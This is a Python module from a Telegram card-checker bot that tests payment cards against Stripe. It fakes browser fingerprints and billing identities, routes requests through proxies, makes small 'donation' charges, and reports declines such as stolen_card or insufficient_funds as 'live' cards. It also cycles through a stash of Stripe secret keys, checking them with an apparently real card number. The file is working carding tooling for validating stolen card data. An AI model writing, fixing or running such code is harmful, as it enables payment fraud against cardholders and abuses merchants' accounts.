import httpx
import asyncio
import time
import random
import string
import json
import os

STRIPE_API = "https://api.stripe.com/v1"

# Where the PK/SK live.  There are two copies of the bot on the server
# (the one the Telegram bot runs and the one the web panel runs), and
# they used to keep their own pk_config.json -- so a key set with
# /addpk never reached the panel.  STRIPE_KEY_CONFIG points both at the
# same file; without it the old per-copy path is used.
PK_CONFIG_FILE = os.environ.get("STRIPE_KEY_CONFIG") or os.path.join(
    os.path.dirname(__file__), "..", "pk_config.json")

LIVE_DECLINE_CODES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
    "transaction_not_allowed", "card_not_supported",
]


def _load_pk_config():
    try:
        if os.path.exists(PK_CONFIG_FILE):
            with open(PK_CONFIG_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}


def _save_pk_config(config):
    try:
        with open(PK_CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=2)
    except Exception:
        pass


def set_pk_key(pk, sk=""):
    """Save the publishable key (and the secret key when it is given).

    A publishable key and a secret key belong to the SAME Stripe
    account.  So when the PK changes and no new SK comes with it, the
    old SK is dropped: keeping it would leave a pair that Stripe
    rejects and every full auth call would fail with "invalid api
    key".  The same PK without a new SK keeps the SK it has.

    Returns what happened, so the caller can tell the user.
    """
    config = _load_pk_config()
    old_pk = config.get("pk", "")
    old_sk = config.get("sk", "")
    config["pk"] = pk
    cleared = False
    if sk:
        config["sk"] = sk
    elif old_sk and pk != old_pk:
        config["sk"] = ""
        cleared = True
    _save_pk_config(config)
    return {"cleared_sk": cleared, "old_pk": old_pk, "old_sk": old_sk}


async def check_stripe_keys(pk="", sk="", timeout=25):
    """Ask Stripe whether the keys are alive and what they can do.

    Returns (pk_state, pk_note, sk_state, sk_note).  A state is:

      "ok"       -- Stripe knows the key and the account may tokenize
                    cards, so the card gates can use it
      "dead"     -- Stripe does not know the key: it is revoked, expired
                    or mistyped
      "no_cards" -- the key is known, but the account has raw-card
                    access switched off, so the card gates cannot check
                    cards with it
      "unknown"  -- Stripe could not be reached.  That is NOT the same
                    as a dead key, and the key is not refused for it.

    The probe uses the Stripe test card, so no real card is involved.
    """
    pk_state = sk_state = "unknown"
    pk_note = sk_note = ""
    try:
        import httpx
    except Exception:
        return pk_state, "httpx is missing", sk_state, "httpx is missing"

    def _read_error(resp):
        try:
            body = resp.json()
        except Exception:
            return "", ""
        err = body.get("error") or {}
        if not isinstance(err, dict):
            return "", ""
        return str(err.get("code") or ""), str(err.get("message") or "")

    def _judge(code, msg, status):
        """What does this Stripe answer mean for a key?"""
        low = msg.lower()
        if status == 401 or code in ("invalid_key", "unknown_api_key", \
                                     "api_key_expired") or \
                "invalid api key" in low or "no such publishable key" in low:
            return "dead", "Stripe does not know this key (revoked, expired or mistyped)"
        if "integration surface is unsupported" in low or \
                "not allowed to perform this request" in low or \
                "raw card" in low or status == 402:
            return ("no_cards",
                    "the account has raw-card access switched off, so the "
                    "card gates cannot check cards with this key")
        return "ok", "Stripe accepts the key"

    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(timeout)) as client:
            if sk:
                try:
                    r = await client.get(
                        f"{STRIPE_API}/account",
                        headers={"Authorization": f"Bearer {sk}"})
                    if r.status_code == 200:
                        sk_state = "ok"
                        sk_note = "the account answers"
                    elif r.status_code in (401, 403):
                        sk_state = "dead"
                        sk_note = ("Stripe refused it (401) -- the key is "
                                   "revoked or invalid")
                    else:
                        sk_note = f"Stripe answered {r.status_code}"
                except Exception as e:
                    sk_note = f"Stripe could not be reached ({type(e).__name__})"

                if sk_state == "ok":
                    # Can the account tokenize a card at all?  A 402 here
                    # means the account exists but raw-card access is off.
                    try:
                        r = await client.post(
                            f"{STRIPE_API}/payment_methods",
                            headers={"Authorization": f"Bearer {sk}"},
                            data={"type": "card",
                                  "card[number]": "4242424242424242",
                                  "card[cvc]": "123", "card[exp_month]": "12",
                                  "card[exp_year]": "2030"})
                        code, msg = _read_error(r)
                        state, note = _judge(code, msg, r.status_code)
                        if state == "dead":
                            sk_state, sk_note = "dead", note
                        elif state == "no_cards":
                            sk_state, sk_note = "no_cards", note
                        else:
                            sk_state = "ok"
                            sk_note = "the account answers and can tokenize cards"
                    except Exception as e:
                        sk_note = f"Stripe could not be reached ({type(e).__name__})"

            if pk:
                # The Stripe test card: not a real card and nothing is
                # charged.  It only shows what Stripe does with the key.
                try:
                    r = await client.post(
                        f"{STRIPE_API}/payment_methods",
                        data={"type": "card",
                              "card[number]": "4242424242424242",
                              "card[cvc]": "123", "card[exp_month]": "12",
                              "card[exp_year]": "2030", "key": pk})
                    code, msg = _read_error(r)
                    state, note = _judge(code, msg, r.status_code)
                    if state == "ok":
                        pk_state = "ok"
                        pk_note = "Stripe accepts the publishable key"
                    else:
                        pk_state, pk_note = state, note
                except Exception as e:
                    pk_note = f"Stripe could not be reached ({type(e).__name__})"
    except Exception as e:
        return "unknown", type(e).__name__, "unknown", type(e).__name__
    return pk_state, pk_note, sk_state, sk_note


def get_pk_key():
    config = _load_pk_config()
    return config.get("pk", ""), config.get("sk", "")


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"


def _random_name():
    firsts = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Christopher"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    return random.choice(firsts), random.choice(lasts)


# ─── CHARGE FUNCTIONS ($0.50 and $1) ─────────────────────────────────────────

def _load_charge_sk():
    """The secret key to charge with.

    Every key the bot holds is a candidate; a revoked one is skipped, so
    a dead key in config.json cannot break the charge gates while the key
    from /addpk still works.
    """
    sk = _working_sk()
    if sk:
        return sk
    try:
        config_path = os.path.join(os.path.dirname(__file__), "..", "config.json")
        if os.path.exists(config_path):
            with open(config_path, "r") as f:
                cfg = json.load(f)
            sk = cfg.get("charge_sk", "")
            if sk:
                return sk
    except Exception:
        pass
    config = _load_pk_config()
    return config.get("sk", "")


async def stripe_charge_check(cc, mm, yy, cvv, amount_cents=50, proxy=None, **kwargs):
    """
    Charge a card via Stripe using SK key.
    amount_cents: 50 for $0.50, 100 for $1.00
    Returns: string response for bot compatibility
    """
    config = _load_pk_config()
    pk = config.get("pk", "")
    sk = _load_charge_sk()

    if not pk:
        return "Error - No PK key configured. Admin: /addpk <pk_live_xxx>"
    if not sk:
        return "Error - No SK key configured. Admin: /addpk <pk_live_xxx> <sk_live_xxx>"

    start = time.time()
    amount_label = f"${amount_cents / 100:.2f}"

    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy

    first, last = _random_name()
    email = _random_email()

    guid = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
    muid = f"{''.join(random.choices('0123456789abcdef', k=8))}-{''.join(random.choices('0123456789abcdef', k=4))}-{''.join(random.choices('0123456789abcdef', k=4))}-{''.join(random.choices('0123456789abcdef', k=4))}-{''.join(random.choices('0123456789abcdef', k=12))}"
    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))

    client_kwargs = {"timeout": httpx.Timeout(20), "follow_redirects": True}
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:
        # Step 1: Create payment method
        pm_data = (
            f"type=card"
            f"&billing_details[name]={first}+{last}"
            f"&billing_details[email]={email}"
            f"&billing_details[address][city]=New+York"
            f"&billing_details[address][country]=US"
            f"&billing_details[address][line1]={random.randint(100, 999)}+Broadway"
            f"&billing_details[address][postal_code]={random.randint(10001, 10199)}"
            f"&card[number]={cc}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={mm.zfill(2)}"
            f"&card[exp_year]={exp_year}"
            f"&guid={guid}"
            f"&muid={muid}"
            f"&sid={sid}"
            f"&pasted_fields=number"
            f"&payment_user_agent=stripe.js%2Ff5ddf352d5%3B+stripe-js-v3%2Ff5ddf352d5%3B+card-element"
            f"&referrer=https%3A%2F%2Fcheckout.stripe.com"
            f"&time_on_page={random.randint(30000, 90000)}"
            f"&key={pk}"
        )

        try:
            resp1 = await client.post(
                f"{STRIPE_API}/payment_methods",
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                },
                content=pm_data,
            )
            result1 = resp1.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - PM request failed: {type(e).__name__}: {str(e)[:50]} [{elapsed}s]"

        if "error" in result1:
            err = result1["error"]
            code = err.get("code", "")
            decline = err.get("decline_code", "")
            msg = err.get("message", "")
            elapsed = round(time.time() - start, 2)
            # A key Stripe refuses says nothing about the card -- the check
            # never happened, so it is an error and NOT a decline.
            if (code in ("invalid_api_key", "api_key_expired")
                    or "invalid api key" in msg.lower()
                    or "api key" in msg.lower() and "expired" in msg.lower()):
                return f"Error - Stripe key rejected ({msg[:60]}) [{elapsed}s]"
            if code == "incorrect_number":
                return f"Declined - Incorrect Card Number [{elapsed}s]"
            if code in ("invalid_expiry_year", "invalid_expiry_month"):
                return f"Declined - Invalid Expiry [{elapsed}s]"
            if code == "expired_card":
                return f"Declined - Card Expired [{elapsed}s]"
            if decline in LIVE_DECLINE_CODES:
                return f"Approved - {decline} (Live) {amount_label} [{elapsed}s]"
            if (code in ("invalid_api_key", "api_key_expired")
                    or "invalid api key" in msg.lower()):
                return f"Error - Stripe key rejected ({msg[:60]}) [{elapsed}s]"
            if code == "card_declined":
                return f"Declined - {decline or msg[:60]} {amount_label} [{elapsed}s]"
            return f"Declined - {code}: {msg[:60]} [{elapsed}s]"

        pm_id = result1.get("id")
        if not pm_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - No PM ID [{elapsed}s]"

        # Step 2: Create PaymentIntent with charge
        try:
            pi_data = {
                "amount": str(amount_cents),
                "currency": "usd",
                "payment_method": pm_id,
                "confirm": "true",
                "off_session": "true",
                "description": f"Donation {amount_label}",
            }

            resp2 = await client.post(
                f"{STRIPE_API}/payment_intents",
                data=pi_data,
                auth=(sk, ""),
                timeout=25,
            )
            result2 = resp2.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - PI request failed: {type(e).__name__}: {str(e)[:50]} [{elapsed}s]"

        elapsed = round(time.time() - start, 2)
        status = result2.get("status", "")

        if status == "succeeded":
            return f"Charged {amount_label} - Payment Successful [{elapsed}s]"

        if status == "requires_action":
            return f"Approved - 3DS Required (Live) {amount_label} [{elapsed}s]"

        if "error" in result2:
            err = result2["error"]
            code = err.get("code", "")
            decline = err.get("decline_code", "")
            msg = err.get("message", "")

            # A key Stripe refuses says nothing about the card -- the check
            # never happened, so it is an error and NOT a decline.
            if (code in ("invalid_api_key", "api_key_expired")
                    or "invalid api key" in msg.lower()
                    or "expired api key" in msg.lower()):
                return f"Error - Stripe key rejected ({msg[:60]}) [{elapsed}s]"

            if decline in LIVE_DECLINE_CODES or code in LIVE_DECLINE_CODES:
                return f"Approved - {decline or code} (Live) {amount_label} [{elapsed}s]"

            if code == "card_declined" and decline == "fraudulent":
                return f"Declined - Fraudulent {amount_label} [{elapsed}s]"

            if code == "card_declined":
                return f"Declined - {decline or 'card_declined'} {amount_label} [{elapsed}s]"

            if code == "authentication_required":
                return f"Approved - 3DS Required (Live) {amount_label} [{elapsed}s]"

            if "api key" in msg.lower():
                return f"Error - Stripe key rejected ({msg[:50]}) [{elapsed}s]"
            return f"Declined - {code}: {msg[:50]} {amount_label} [{elapsed}s]"

        return f"Declined - Status: {status} {amount_label} [{elapsed}s]"


async def stripe_charge_050(cc, mm, yy, cvv, proxy=None, **kwargs):
    """Charge $0.50"""
    return await stripe_charge_check(cc, mm, yy, cvv, amount_cents=50, proxy=proxy, **kwargs)


async def stripe_charge_100(cc, mm, yy, cvv, proxy=None, **kwargs):
    """Charge $1.00"""
    return await stripe_charge_check(cc, mm, yy, cvv, amount_cents=100, proxy=proxy, **kwargs)


# ── secret key health ─────────────────────────────────────────────────────
# A revoked Stripe key fails every charge and every auth with a plain
# 401, which looks like a broken gate.  The candidates are checked against
# Stripe once an hour so a dead key is skipped instead of used.
_SK_HEALTH = {}
_SK_HEALTH_TTL = 3600.0


def _sk_candidates():
    """Every secret key the bot holds, newest source first."""
    out = []
    bot_dir = os.path.join(os.path.dirname(__file__), "..")
    for path, keys in (
        (PK_CONFIG_FILE, ("sk", "charge_sk")),
        (os.path.join(bot_dir, "config.json"), ("charge_sk",)),
        (os.path.join(bot_dir, "skpk.json"), ("sk", "key")),
    ):
        try:
            with open(path) as f:
                data = json.load(f)
        except Exception:
            continue
        for k in keys:
            v = data.get(k)
            if v and v not in out:
                out.append(v)
    env = os.environ.get("SK_STRIPE_KEY", "")
    if env and env not in out:
        out.insert(0, env)
    return out


def _sk_is_working(sk):
    """True when Stripe still accepts this key AND the account can take a
    card (asked once an hour).

    The account check alone is not enough: an account with raw card data
    access switched off refuses every POST /v1/payment_methods with a 402
    ("Sending credit card numbers directly to the Stripe API is generally
    unsafe"), so the key is live but the card gates cannot use it.
    """
    if not sk:
        return False
    now = time.time()
    hit = _SK_HEALTH.get(sk)
    if hit and now - hit[1] < _SK_HEALTH_TTL:
        return hit[0]
    ok = False
    try:
        import requests as _rq
        from requests.auth import HTTPBasicAuth as _BA
        r = _rq.get("https://api.stripe.com/v1/account", auth=_BA(sk, ""), timeout=8)
        if r.status_code == 200:
            # the key works -- now check the account can tokenize a card
            t = _rq.post(
                "https://api.stripe.com/v1/payment_methods",
                data={"type": "card", "card[number]": "5581585612888772",
                      "card[exp_month]": "12", "card[exp_year]": "2029",
                      "card[cvc]": "354"},
                auth=_BA(sk, ""), timeout=10)
            ok = t.status_code == 200
    except Exception:
        ok = False
    _SK_HEALTH[sk] = (ok, now)
    return ok


def _working_sk():
    """The first candidate key that Stripe still accepts."""
    for sk in _sk_candidates():
        if _sk_is_working(sk):
            return sk
    return ""
